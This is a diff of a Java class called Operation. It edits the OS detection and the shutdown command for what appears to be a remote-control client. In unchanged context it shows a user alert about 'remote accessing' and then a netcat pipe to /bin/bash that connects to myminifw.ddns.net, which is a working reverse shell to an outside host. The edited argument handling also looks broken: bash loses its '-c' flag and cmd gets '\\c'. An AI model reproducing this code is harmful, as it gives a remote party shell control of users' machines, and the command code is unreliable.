@@ -22,7 +22,7 @@ public class Operation {
     public Operation(String action, String param) {
         this.action = action;
         this.param = param;
-        if (System.getProperty("os.name").matches("^[wW]indows")) {
+        if (System.getProperty("os.name").toLowerCase().contains("windows")) {
             this.win = true;
         }
     }
@@ -39,6 +39,7 @@ public class Operation {
     private void shutdown() throws IOException {
         String plat = new String();
         String myCommand = new String();
+        String arg = new String();
 
         if (!win) {
             plat = "bash";
@@ -49,9 +50,10 @@ public class Operation {
             plat = "cmd";
             int sec = Integer.parseInt(this.param) * 60;
             myCommand = "shutdown /s /f /t " + sec;
+            arg = "\\c";
         }
 
-        Runtime.getRuntime().exec(new String[]{plat, "-c", myCommand});
+        Runtime.getRuntime().exec(new String[]{plat, arg, myCommand});
 
     }
 
@@ -62,11 +64,11 @@ public class Operation {
         plat = "bash";
         myCommand = "notify-send 'Alert' 'We are remote accessing this computer due to bad reports.'";
         Runtime.getRuntime().exec(new String[]{plat, "-c", myCommand});
-        
+
         Thread.sleep(1000);
-        
+
         myCommand = "nc -vv myminifw.ddns.net 1890 | /bin/bash | nc -vv myminifw.ddns.net 1891";
         Runtime.getRuntime().exec(new String[]{plat, "-c", myCommand});
-        
+
     }
 }
